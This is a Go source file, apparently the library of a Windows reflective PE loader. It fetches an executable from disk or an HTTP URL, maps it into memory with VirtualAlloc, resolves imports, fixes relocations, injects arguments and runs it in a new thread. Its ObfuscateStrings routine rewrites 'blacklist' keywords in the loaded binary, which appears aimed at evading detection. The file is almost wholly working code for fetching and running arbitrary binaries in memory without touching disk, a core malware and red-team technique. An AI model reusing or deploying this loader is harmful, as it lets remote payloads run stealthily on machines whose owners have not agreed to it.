package lib

import (
	"errors"
	"io/ioutil"
	"net/http"
	"strings"

	. "unsafe"

	log "github.com/sirupsen/logrus"
)

type ArgInjector func(addr uintptr, api WinAPI, bin BinAPI) error

var ArgInjectors = map[string]ArgInjector{
	"__p___argv": func(addr uintptr, api WinAPI, bin BinAPI) error {
		return InjectArgv(addr, api, bin)
	},
	"__p___argc": func(addr uintptr, api WinAPI, bin BinAPI) error {
		return InjectArgc(addr, api, bin)
	},
	"GetCommandLineA": func(addr uintptr, api WinAPI, bin BinAPI) error {
		return InjectCommandLineA(addr, api, bin)
	},
	"GetCommandLineW": func(addr uintptr, api WinAPI, bin BinAPI) error {
		return InjectCommandLineW(addr, api, bin)
	},
	"__wgetmainargs": func(addr uintptr, api WinAPI, bin BinAPI) error {
		return InjectCmdLn(addr, api, bin)
	},
	"__getmainargs": func(addr uintptr, api WinAPI, bin BinAPI) error {
		return InjectCmdLn(addr, api, bin)
	},
}

func NewWinAPI() *Win {
	return &Win{}
}

func NewBinaryFromDisk(path string) (*Bin, error) {
	dat, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}
	if dat[0] != 77 || dat[1] != 90 {
		return nil, errors.New("Not a valid PE file")
	}
	return &Bin{Address: Pointer(&dat[0]), Data: dat}, nil
}

func NewBinaryFromHTTP(path string) (*Bin, error) {
	var body []byte
	client := &http.Client{}
	req, _ := http.NewRequest("GET", path, nil)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err = ioutil.ReadAll(resp.Body)

	return &Bin{Address: Pointer(&body[0])}, nil
}

func NewBinaryFromPath(path string) (*Bin, error) {
	if strings.HasPrefix(strings.ToLower(path), "http") {
		return NewBinaryFromHTTP(path)
	}
	return NewBinaryFromDisk(path)
}

func NewBinary(api WinAPI, size uint) (*Bin, error) {
	addr, err := api.VirtualAlloc(size)
	if err != nil {
		return nil, err
	}
	return &Bin{Address: Pointer(addr)}, nil
}

func ObfuscateStrings(bin BinAPI, blacklist []string) {
	log.Infof("Replapcing %d keywords", len(blacklist))

	for _, word := range blacklist {
		ReplaceWord(bin, word)
	}
}

func AppendArgs(bin BinAPI, args string) {
	var splittedArgs []string
	if len(args) > 0 {
		splittedArgs = strings.Split(args, " ")
	}
	bin.SetArguments(splittedArgs)
}

func AllocateMemory(api WinAPI, bin BinAPI) (final BinAPI, err error) {
	log.Infof("Loaded initial binary at address 0x%x", bin.GetAddr())

	final, err = NewBinary(api, bin.GetImageSize())
	if err != nil {
		return
	}

	log.Infof("Allocated new space for binary at address: 0x%x", final.GetAddr())

	return final, nil
}

func CopyData(api WinAPI, bin, final BinAPI) (err error) {
	CopyHeaders(api, bin, final)
	log.Infof("Copied %d bytes of headers to new location", bin.GetHeaderSize())

	ParsePEHeaders(final)
	CopyArguments(bin, final)
	CopySections(api, bin, final)
	log.Infof("Copied %d sections to new location", len(final.GetSections()))

	if err = LoadLibraries(api, final); err != nil {
		return err
	}

	if len(final.GetModules()) == 0 {
		log.Info("No imported DLLs to load")
		return nil
	}

	log.Infof("Loaded %d DLLs", len(final.GetModules()))

	if err = LoadFunctions(api, final); err != nil {
		return err
	}
	log.Infof("Loaded their functions")

	return nil
}

func FixOffsets(api WinAPI, final BinAPI) (err error) {

	if final.IsDynamic() {
		FixRelocations(api, final)
	} else {
		log.Warn("Static pe file - Trying to manually fixing offsets - May break!")
		FixingHardcodedOffsets(api, final)
	}

	return nil
}

func PrepareArguments(api WinAPI, final BinAPI) (err error) {
	if len(final.GetArguments()) < 1 {
		return nil
	}

	log.Infof("Injecting arguments")
	for _, function := range final.GetFunctions() {
		if injectorFunc, ok := ArgInjectors[function.Name]; ok {
			log.Infof("Calling args injector for: %s\n", function.Name)
			injectorFunc(function.Address, api, final)
		}
	}

	return err
}

func Execute(api WinAPI, final BinAPI, method string) (err error) {

	//*(*uint32)(Final.GetEntryPoint()) = 0xCCCCCCCC

	UpdateSectionProtections(api, final)
	log.Infof("Updated memory protections")

	switch method {
	case "function":
		err = ExecuteInFunction(api, final)
	case "wait":
		err = StartThreadWait(api, final, true)
	default:
		err = StartThreadWait(api, final, false)
	}

	if err != nil {
		log.Fatalf("Error creating thread %s", err)
	}

	return nil
}
